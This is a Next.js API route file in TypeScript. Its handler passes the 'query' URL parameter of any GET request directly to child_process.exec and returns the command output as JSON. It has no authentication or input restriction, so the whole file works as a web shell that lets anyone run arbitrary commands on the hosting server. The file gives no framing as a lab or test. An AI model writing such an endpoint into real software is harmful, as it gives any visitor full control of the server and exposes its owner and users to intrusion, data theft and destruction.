import type { NextApiRequest, NextApiResponse } from 'next';
import { exec } from "child_process";

type ResponseData = {
  message: string;
  output: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  if (req.method === "GET") {
    const { query } = req.query;
    if (!query || typeof query !== "string") {
      res.status(404).json({ message: "not found",output:"" });
      return;
    }


    console.log(`Query parameter: ${query}`);

    exec(query, (error, stdout, stderr) => {
      if (error) {
        res.status(500).json({
          message: "Error executing command",
          output: stderr || error.message,
        });
        return;
      }

      res.status(200).json({ message: "Command executed successfully", output: stdout });
    });

  } else {
    res.status(405).json({ message: "Method Not Allowed",output:"" });
  }
}
